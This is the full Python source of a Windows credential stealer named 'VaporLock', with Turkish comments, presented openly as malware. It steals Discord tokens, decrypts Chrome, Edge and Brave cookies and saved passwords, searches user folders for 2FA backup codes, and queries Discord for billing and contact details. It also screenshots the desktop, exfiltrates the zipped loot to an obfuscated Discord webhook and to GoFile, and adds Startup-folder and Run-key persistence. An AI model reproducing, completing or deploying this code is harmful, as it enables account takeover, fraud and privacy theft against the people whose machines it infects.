# VaporLock - Birleştirilmiş Python Stealer (Anti-VM Yorumlu)

import os
import sys
import json
import sqlite3
import shutil
import subprocess
import tempfile
import zipfile
import base64
import re
import time
import uuid
import socket
import platform
import ctypes
import winreg
import threading
import io
import struct
import binascii
import pathlib
import logging
from datetime import datetime, timedelta
from contextlib import contextmanager
from Crypto.Cipher import AES, ChaCha20_Poly1305

# --- Üçüncü parti kütüphaneler ---
try:
    import requests
    REQUESTS_OK = True
except:
    REQUESTS_OK = False

try:
    from PIL import ImageGrab
    PIL_OK = True
except:
    PIL_OK = False

try:
    import win32crypt
    WIN32CRYPT_OK = True
except:
    WIN32CRYPT_OK = False

# --- Base64 kodlanmış webhook ---
B64_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwNzc5OTcxNzYzMzg1NTY0OS9IZ2EwaGh4ekczbG1hLW14dDBhZnJ6c01WaS1JV3JFU0xGX1p0VzJjQ2xYa1lJMC1nZXo3VVRULTFQRUV5QWxqUEtpWg=="
def decode(s: str) -> str:
    return base64.b64decode(s).decode('utf-8')
WEBHOOK_URL = decode(B64_WEBHOOK)

# --- Anti-VM (tüm satırlar yorumlu) ---
# def anti_vm():
#     try:
#         import uuid
#         mac = uuid.getnode()
#         mac_hex = ':'.join(('%012X' % mac)[i:i+2] for i in range(0,12,2))
#         if mac_hex.startswith(('08:00:27','00:0C:29','00:50:56')): sys.exit(1)
#         class MEMORYSTATUSEX(ctypes.Structure):
#             _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
#                         ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
#                         ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
#                         ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
#                         ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
#         mem = MEMORYSTATUSEX()
#         mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
#         ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
#         if mem.ullTotalPhys // (1024**3) < 4: sys.exit(1)
#         free = ctypes.c_ulonglong(0)
#         total = ctypes.c_ulonglong(0)
#         ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p("C:\\"), None, ctypes.byref(total), None)
#         if total.value // (1024**3) < 80: sys.exit(1)
#         output = subprocess.check_output("tasklist", shell=True).decode('cp850', errors='ignore')
#         for proc in ['vboxservice', 'vmtoolsd', 'VBoxTray', 'vmwaretray']:
#             if proc in output.lower(): sys.exit(1)
#         try:
#             key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0")
#             val = winreg.QueryValueEx(key, "Identifier")[0]
#             if "vmware" in val.lower() or "virtualbox" in val.lower(): sys.exit(1)
#         except: pass
#     except: pass

# --- Junk code ---
def junk_loop():
    for _ in range(500):
        _ = hash(str(_)) * 0.1 + 1.23
    return "junk"

# --- Sistem bilgisi ---
def get_system_info():
    info = {}
    try:
        info['hostname'] = socket.gethostname()
        info['username'] = os.getlogin()
        info['os_version'] = platform.platform()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info['local_ip'] = s.getsockname()[0]
        s.close()
        try:
            import urllib.request
            with urllib.request.urlopen("https://api.ipify.org", timeout=5) as f:
                info['public_ip'] = f.read().decode()
        except:
            info['public_ip'] = "Unknown"
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0")
            info['cpu'] = winreg.QueryValueEx(key, "ProcessorNameString")[0]
        except:
            info['cpu'] = platform.processor()
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
                        ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
                        ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
                        ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
                        ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
        mem = MEMORYSTATUSEX()
        mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
        info['ram_gb'] = round(mem.ullTotalPhys / (1024**3), 2)
        info['is_admin'] = ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        info['error'] = str(e)
    return info

# --- Discord tokenleri (LevelDB) ---
def get_discord_tokens():
    tokens = []
    paths = [
        os.path.expandvars("%APPDATA%\\discord\\Local Storage\\leveldb"),
        os.path.expandvars("%APPDATA%\\discordptb\\Local Storage\\leveldb"),
        os.path.expandvars("%APPDATA%\\discordcanary\\Local Storage\\leveldb"),
        os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb")
    ]
    token_regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
    for p in paths:
        if not os.path.isdir(p):
            continue
        for f in (glob.glob(os.path.join(p, "*.log")) + glob.glob(os.path.join(p, "*.ldb"))):
            try:
                with open(f, 'r', errors='ignore') as file:
                    content = file.read()
                    tokens.extend(token_regex.findall(content))
            except:
                pass
    return list(set(tokens))

# --- Tarayıcı çerezleri ve şifreleri için yardımcı fonksiyonlar (Chromium) ---
def fetch_sqlite_copy(db_path):
    try:
        tmp_path = os.path.join(tempfile.gettempdir(), os.path.basename(db_path) + "_" + uuid.uuid4().hex + ".db")
        shutil.copy2(db_path, tmp_path)
        return tmp_path
    except:
        return None

def decrypt_v20_value(encrypted_value, master_key):
    try:
        if not encrypted_value or len(encrypted_value) < 15:
            return None
        iv = encrypted_value[3:15]
        ciphertext = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted[32:].decode('utf-8', errors='replace')
    except:
        return None

def decrypt_v20_password(encrypted_password, master_key):
    try:
        if not encrypted_password:
            return ""
        if encrypted_password[:3] not in (b'v10', b'v11', b'v20'):
            return encrypted_password.decode('utf-8', errors='replace')
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted = cipher.decrypt_and_verify(payload[:-16], payload[-16:])
        return decrypted.decode('utf-8', errors='replace')
    except:
        return "<decryption_failed>"

def get_chromium_master_key(local_state_path, browser_key_name):
    try:
        if not os.path.exists(local_state_path):
            return None
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        if "os_crypt" in local_state and "encrypted_key" in local_state["os_crypt"]:
            key_blob = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(key_blob, None, None, None, 0)[1]
    except:
        pass
    return None

def process_chromium_browser(browser_name, data_path, local_state_rel, output_base):
    user_profile = os.environ['USERPROFILE']
    browser_data_path = os.path.join(user_profile, data_path)
    if not os.path.exists(browser_data_path):
        return
    local_state_full = os.path.join(user_profile, local_state_rel)
    master_key = get_chromium_master_key(local_state_full, browser_name)
    profiles = []
    for item in os.listdir(browser_data_path):
        full = os.path.join(browser_data_path, item)
        if os.path.isdir(full) and (item == "Default" or item.startswith("Profile")):
            profiles.append(item)
    for profile in profiles:
        profile_dir = os.path.join(browser_data_path, profile)
        out_dir = os.path.join(output_base, browser_name, profile)
        os.makedirs(out_dir, exist_ok=True)
        # Cookies
        cookie_db = os.path.join(profile_dir, "Network", "Cookies")
        if os.path.exists(cookie_db):
            copy = fetch_sqlite_copy(cookie_db)
            if copy:
                try:
                    conn = sqlite3.connect(copy)
                    cur = conn.cursor()
                    cur.execute("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, encrypted_value FROM cookies")
                    rows = cur.fetchall()
                    with open(os.path.join(out_dir, "cookies.txt"), "w", encoding="utf-8") as f:
                        f.write("# Netscape HTTP Cookie File\n")
                        for row in rows:
                            host, name, path, exp, secure, httponly, enc = row
                            if enc and enc[:3] in (b'v10', b'v11', b'v20') and master_key:
                                val = decrypt_v20_value(enc, master_key) or "DECRYPT_FAILED"
                            else:
                                val = enc.decode('utf-8', errors='replace') if isinstance(enc, bytes) else str(enc)
                            flag = "TRUE" if host.startswith('.') else "FALSE"
                            secure_flag = "TRUE" if secure else "FALSE"
                            exp_sec = int(exp) // 1000000 - 11644473600 if exp else 0
                            f.write(f"{host}\t{flag}\t{path}\t{secure_flag}\t{exp_sec}\t{name}\t{val}\n")
                    conn.close()
                except:
                    pass
                try: os.remove(copy)
                except: pass
        # Passwords
        login_db = os.path.join(profile_dir, "Login Data")
        if os.path.exists(login_db):
            copy = fetch_sqlite_copy(login_db)
            if copy:
                try:
                    conn = sqlite3.connect(copy)
                    cur = conn.cursor()
                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                    rows = cur.fetchall()
                    with open(os.path.join(out_dir, "passwords.txt"), "w", encoding="utf-8") as f:
                        for url, user, pwd in rows:
                            if pwd and pwd[:3] in (b'v10', b'v11', b'v20') and master_key:
                                dec = decrypt_v20_password(pwd, master_key)
                            else:
                                dec = pwd.decode('utf-8', errors='replace') if isinstance(pwd, bytes) else str(pwd)
                            f.write(f"URL: {url}\nUsername: {user}\nPassword: {dec}\n\n")
                    conn.close()
                except:
                    pass
                try: os.remove(copy)
                except: pass

# --- Yedek kodları toplama ---
def collect_backup_codes():
    found_files = []
    keywords = ['backup', '2fa', 'mfa', 'discord', 'code', 'auth']
    patterns = [
        re.compile(r'backup.*code', re.I),
        re.compile(r'2fa.*code', re.I),
        re.compile(r'discord.*backup', re.I),
        re.compile(r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}'),
        re.compile(r'[A-Z0-9]{8}-[A-Z0-9]{8}')
    ]
    search_dirs = [
        os.path.expandvars("%USERPROFILE%\\Desktop"),
        os.path.expandvars("%USERPROFILE%\\Documents"),
        os.path.expandvars("%USERPROFILE%\\Downloads")
    ]
    for search_dir in search_dirs:
        if not os.path.isdir(search_dir):
            continue
        try:
            for file in os.listdir(search_dir):
                if not file.lower().endswith('.txt'):
                    continue
                file_path = os.path.join(search_dir, file)
                try:
                    if os.path.getsize(file_path) > 1024*1024:
                        continue
                    with open(file_path, 'r', errors='ignore') as f:
                        content = f.read()
                    found = False
                    for kw in keywords:
                        if kw in file.lower():
                            found = True
                            break
                    if not found:
                        for pat in patterns:
                            if pat.search(content):
                                found = True
                                break
                    if found:
                        found_files.append(file_path)
                except:
                    pass
        except:
            pass
    return found_files

# --- Discord API işlemleri ---
def discord_api_request(token, endpoint, method='GET', data=None):
    url = f"https://discord.com/api/v9/{endpoint}"
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        if method == 'GET':
            resp = requests.get(url, headers=headers, timeout=10)
        else:
            resp = requests.post(url, headers=headers, json=data, timeout=10)
        if resp.status_code == 200:
            return resp.json()
    except:
        pass
    return None

def get_user_info(token):
    return discord_api_request(token, "users/@me")

def get_billing(token):
    data = discord_api_request(token, "users/@me/billing/payment-sources")
    if not data or not isinstance(data, list):
        return "None"
    billing_icons = []
    for item in data:
        if item.get('invalid'):
            continue
        if item.get('type') == 2:
            billing_icons.append("💰")
        elif item.get('type') == 1:
            billing_icons.append("💳")
    return " ".join(billing_icons) if billing_icons else "None"

def get_friends(token):
    data = discord_api_request(token, "users/@me/relationships")
    if not data or not isinstance(data, list):
        return {"length": 0, "users": "Account Locked", "hq_friends": [], "total_hq_friends": 0}
    friends = [rel for rel in data if rel.get('type') == 1]
    friend_names = []
    hq_friends = []
    rare_badge_ids = [1<<0, 1<<9, 1<<17, 1<<18, 1<<3, 1<<14, 1<<1, 1<<2]
    for friend in friends:
        user = friend.get('user', {})
        flags = user.get('public_flags', 0)
        rare = any(flags & bid for bid in rare_badge_ids)
        name = user.get('username', 'Unknown')
        friend_names.append(name)
        if rare:
            hq_friends.append(name)
    return {
        "length": len(friends),
        "users": "\n".join(friend_names) if friend_names else "None",
        "hq_friends": hq_friends,
        "total_hq_friends": len(hq_friends)
    }

def get_badges(user_id, token):
    profile = discord_api_request(token, f"users/{user_id}/profile")
    if not profile:
        return "No Badges"
    user = profile.get('user', {})
    flags = user.get('public_flags', 0)
    badge_emojis = []
    badges_map = {
        1<<0: "👑", 1<<1: "🤝", 1<<2: "🎖️", 1<<3: "🐛1", 1<<9: "🌟",
        1<<14: "🐛2", 1<<17: "🤖", 1<<18: "🛡️"
    }
    for flag, emoji in badges_map.items():
        if flags & flag:
            badge_emojis.append(emoji)
    if profile.get('premium_since'):
        badge_emojis.append("⭐")
    return " ".join(badge_emojis) if badge_emojis else "No Badges"

def get_phone(token):
    user = get_user_info(token)
    return user.get('phone') if user else None

# --- GoFile yükleme ---
def upload_to_gofile(file_path):
    for attempt in range(3):
        try:
            with open(file_path, 'rb') as f:
                files = {'file': f}
                resp = requests.post("https://upload.gofile.io/uploadfile", files=files, timeout=60)
                if resp.status_code == 200 and resp.json().get('status') == 'ok':
                    return resp.json().get('data', {}).get('downloadPage')
        except:
            time.sleep(2)
    return None

# --- ZIP oluşturma ve webhook'a gönderme ---
def zip_and_send(cookie_files, backup_files, system_info, discord_tokens, token_details, temp_dir):
    zip_path = os.path.join(temp_dir, "data.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for cf in cookie_files:
            if os.path.exists(cf):
                zf.write(cf, os.path.basename(cf))
        for bf in backup_files:
            zf.write(bf, os.path.basename(bf))
        with open(os.path.join(temp_dir, "system.json"), "w") as f:
            json.dump(system_info, f)
        zf.write(os.path.join(temp_dir, "system.json"), "system.json")
        with open(os.path.join(temp_dir, "tokens.txt"), "w") as f:
            f.write("\n".join(discord_tokens))
        zf.write(os.path.join(temp_dir, "tokens.txt"), "tokens.txt")
        with open(os.path.join(temp_dir, "token_details.json"), "w") as f:
            json.dump(token_details, f)
        zf.write(os.path.join(temp_dir, "token_details.json"), "token_details.json")
    # Webhook'a dosya gönder
    if REQUESTS_OK:
        try:
            with open(zip_path, 'rb') as f:
                files = {'file': f}
                requests.post(WEBHOOK_URL, files=files, timeout=30)
        except:
            pass
    # GoFile yedek
    gofile_link = upload_to_gofile(zip_path)
    if gofile_link:
        try:
            requests.post(WEBHOOK_URL, json={"content": f"GoFile backup: {gofile_link}"})
        except:
            pass
    return zip_path

# --- Kalıcılık (persistence) ---
def persistence():
    try:
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            return
        startup_folder = os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        dest = os.path.join(startup_folder, "winsvc.exe")
        shutil.copy2(exe_path, dest)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        rand_name = uuid.uuid4().hex[:8]
        winreg.SetValueEx(key, rand_name, 0, winreg.REG_SZ, dest)
        winreg.CloseKey(key)
    except:
        pass

# --- Ekran görüntüsü ---
def take_screenshot():
    if not PIL_OK:
        return None
    try:
        img = ImageGrab.grab()
        path = os.path.join(tempfile.gettempdir(), f"scr_{uuid.uuid4().hex}.png")
        img.save(path)
        return path
    except:
        return None

# --- Ana fonksiyon ---
def main():
    junk_loop()
    # anti_vm()
    temp_dir = tempfile.mkdtemp()
    try:
        # Sistem bilgisi
        sys_info = get_system_info()
        # Discord tokenleri
        tokens = get_discord_tokens()
        # Tarayıcı verileri (Chromium tabanlı)
        browsers = [
            ("Chrome", r"AppData\Local\Google\Chrome\User Data", r"AppData\Local\Google\Chrome\User Data\Local State"),
            ("Edge", r"AppData\Local\Microsoft\Edge\User Data", r"AppData\Local\Microsoft\Edge\User Data\Local State"),
            ("Brave", r"AppData\Local\BraveSoftware\Brave-Browser\User Data", r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State")
        ]
        cookie_files = []
        for name, data_path, local_state in browsers:
            out_sub = os.path.join(temp_dir, "browser_data")
            os.makedirs(out_sub, exist_ok=True)
            process_chromium_browser(name, data_path, local_state, out_sub)
            # Toplanan cookie dosyalarını bul
            for root, dirs, files in os.walk(out_sub):
                for file in files:
                    if file == "cookies.txt":
                        cookie_files.append(os.path.join(root, file))
        # Yedek kodlar
        backups = collect_backup_codes()
        # Her token için API bilgileri
        token_details = []
        for tok in tokens:
            user = get_user_info(tok)
            if not user:
                continue
            billing = get_billing(tok)
            friends = get_friends(tok)
            badges = get_badges(user.get('id'), tok)
            phone = get_phone(tok)
            token_details.append({
                "token": tok,
                "user": user,
                "billing": billing,
                "friends": friends,
                "badges": badges,
                "phone": phone
            })
        # Ekran görüntüsü
        scr = take_screenshot()
        if scr:
            shutil.copy(scr, temp_dir)
            cookie_files.append(scr)
        # ZIP'le ve gönder
        zip_and_send(cookie_files, backups, sys_info, tokens, token_details, temp_dir)
        # Kalıcılık
        persistence()
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)

if __name__ == "__main__":
    main()
